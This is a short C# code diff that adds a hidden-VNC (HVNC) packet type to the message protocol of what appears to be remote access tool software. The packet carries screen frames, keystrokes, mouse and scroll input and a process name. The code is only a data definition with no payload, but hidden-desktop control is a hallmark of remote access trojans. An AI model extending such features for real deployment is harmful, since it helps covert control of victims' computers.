@@ -7,6 +7,7 @@ namespace Common.DTOs.MessagePack
     [Union(1, typeof(ClientInfoDTO))]
     [Union(2, typeof(RemoteDesktopDTO))]
     [Union(3, typeof(PluginDTO))]
+    [Union(4, typeof(HVNCDTO))]
     public interface IPacket
     {
         public Task HandlePacket(Session packetHandler);
@@ -70,6 +71,32 @@ namespace Common.DTOs.MessagePack
         public async Task HandlePacket(Session session)
         {
             session.OnPlugin.Invoke(this, EventArgs.Empty);
+        }
+    }
+
+    [MessagePackObject]
+    public class HVNCDTO : IPacket
+    {
+        [Key(0)]
+        public byte[] Frame { get; set; }
+        [Key(1)]
+        public string Char { get; set; }
+        [Key(2)]
+        public int MouseButton { get; set; }
+        [Key(3)]
+        public bool IsPressed { get; set; }
+        [Key(4)]
+        public double xFactor { get; set; }
+        [Key(5)]
+        public double yFactor { get; set; }
+        [Key(6)]
+        public int scrollDelta { get; set; }
+        [Key(7)]
+        public string process {  get; set; }
+
+        public async Task HandlePacket(Session session)
+        {
+            session.OnHVNC.Invoke(this, EventArgs.Empty);
         }
     }
 }
